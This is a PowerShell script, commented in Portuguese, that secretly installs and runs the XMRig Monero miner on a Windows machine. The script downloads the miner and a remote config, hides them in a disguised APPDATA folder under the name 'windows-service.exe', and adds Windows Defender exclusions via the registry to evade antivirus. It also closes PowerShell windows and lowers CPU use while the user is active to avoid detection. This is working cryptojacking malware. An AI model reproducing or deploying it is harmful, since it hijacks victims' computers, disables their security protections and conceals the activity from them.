# CONFIGURAÇÃO - URLs DOS ARQUIVOS
$MinerURL = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-x64.zip"
$ConfigURL = "https://raw.githubusercontent.com/ruendynarcy/mining/main/config.json"

# Configurações stealth
$WorkingDir = "$env:APPDATA\Microsoft\Network\Cache"
$MinerExe = "windows-service.exe"
$MinerPath = "$WorkingDir\$MinerExe"
$ConfigPath = "$WorkingDir\config.json"

# Função para tornar completamente invisível
function Hide-AllProcesses {
    try {
        $processes = Get-Process -Name "powershell" -ErrorAction SilentlyContinue
        foreach ($process in $processes) {
            if ($process.MainWindowTitle -like "*powershell*") {
                $process.CloseMainWindow() | Out-Null
            }
        }
    } catch { }
}

# Função para bypass silencioso do antivírus
function Add-SilentExclusions {
    try {
        reg add "HKCU\Software\Microsoft\Windows Defender\Exclusions\Paths" /v "$WorkingDir" /t REG_DWORD /d 0 /f 2>$null
        $exclusionFile = "$env:TEMP\defender.reg"
        "@Windows Registry Editor Version 5.00[HKEY_CURRENT_USER\Software\Microsoft\Windows Defender\Exclusions\Paths]"$WorkingDir"=dword:00000000"@ | Set-Content $exclusionFile
        reg import $exclusionFile 2>$null
        Remove-Item $exclusionFile -Force 2>$null
    } catch { }
}

# Função de download silencioso
function Download-Silent {
    param($Url, $Output)
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($Url, $Output)
        return $true
    } catch {
        try {
            Start-BitsTransfer -Source $Url -Destination $Output -ErrorAction SilentlyContinue
            return $true
        } catch {
            return $false
        }
    }
}

# Função de inicialização totalmente invisível
function Initialize-InvisibleMiner {
    # Criar diretório oculto
    if (!(Test-Path $WorkingDir)) {
        New-Item -ItemType Directory -Path $WorkingDir -Force | Out-Null
    }
    attrib +h +s "$WorkingDir" 2>$null
    
    # Adicionar exceções silenciosamente
    Add-SilentExclusions
    
    # Baixar minerador se não existir
    if (!(Test-Path $MinerPath)) {
        Write-Host "[+] Baixando XMRig 6.24.0..."
        $tempZip = "$env:TEMP\update.zip"
        if (Download-Silent -Url $MinerURL -Output $tempZip) {
            try {
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                [System.IO.Compression.ZipFile]::ExtractToDirectory($tempZip, $WorkingDir)
                
                # Procurar pelo executável exato na estrutura de pastas
                $exeFile = Get-ChildItem "$WorkingDir\*.exe" -Recurse | Where-Object { $_.Name -eq "xmrig.exe" } | Select-Object -First 1
                if ($exeFile) {
                    Move-Item $exeFile.FullName $MinerPath -Force
                    # Limpar pasta extra se existir
                    $subDirs = Get-ChildItem "$WorkingDir\*" -Directory
                    foreach ($dir in $subDirs) {
                        Remove-Item $dir.FullName -Recurse -Force 2>$null
                    }
                }
                Remove-Item $tempZip -Force 2>$null
                Write-Host "[+] XMRig 6.24.0 instalado com sucesso"
            } catch {
                Write-Host "[-] Erro na extração: $_"
                return $false
            }
        } else {
            Write-Host "[-] Falha no download do minerador"
            return $false
        }
    }
    
    # Baixar configuração atualizada
    if (Download-Silent -Url $ConfigURL -Output $ConfigPath) {
        Write-Host "[+] Configuração atualizada"
    }
    
    return $true
}

# Função de mineração invisível
function Start-InvisibleMining {
    Start-Sleep 5
    
    while ($true) {
        try {
            $cpu = (Get-WmiObject Win32_Processor).LoadPercentage
            $idleTime = 600
            try { $idleTime = (Get-WmiObject Win32_UserDesktop | Where-Object { $_.__RELPATH -match $env:USERNAME }).IdleTime } catch { }
            $userActive = ($idleTime -lt 180)
        } catch {
            $cpu = 0
            $userActive = $true
        }
        
        $isRunning = Get-Process -Name "windows-service" -ErrorAction SilentlyContinue
        
        if (!$isRunning) {
            if (Test-Path $MinerPath) {
                $threads = if ($userActive -or $cpu -gt 70) { 25 } else { 65 }
                $args = "--config=config.json --cpu-max-threads-hint=$threads --no-title --quiet --randomx-init=0"
                
                $processInfo = New-Object System.Diagnostics.ProcessStartInfo
                $processInfo.FileName = $MinerPath
                $processInfo.Arguments = $args
                $processInfo.WorkingDirectory = $WorkingDir
                $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
                $processInfo.CreateNoWindow = $true
                $processInfo.UseShellExecute = $false
                
                [System.Diagnostics.Process]::Start($processInfo) | Out-Null
                Write-Host "[+] Mineração iniciada ($threads% CPU)"
            }
        } else {
            Write-Host "[✓] Minerando... CPU: $cpu% | Usuário: $userActive"
        }
        
        Start-Sleep 90
    }
}

# EXECUÇÃO PRINCIPAL - TOTALMENTE INVISÍVEL
try {
    Hide-AllProcesses
    if (Initialize-InvisibleMiner) {
        Start-InvisibleMining
    }
} catch {
    exit
}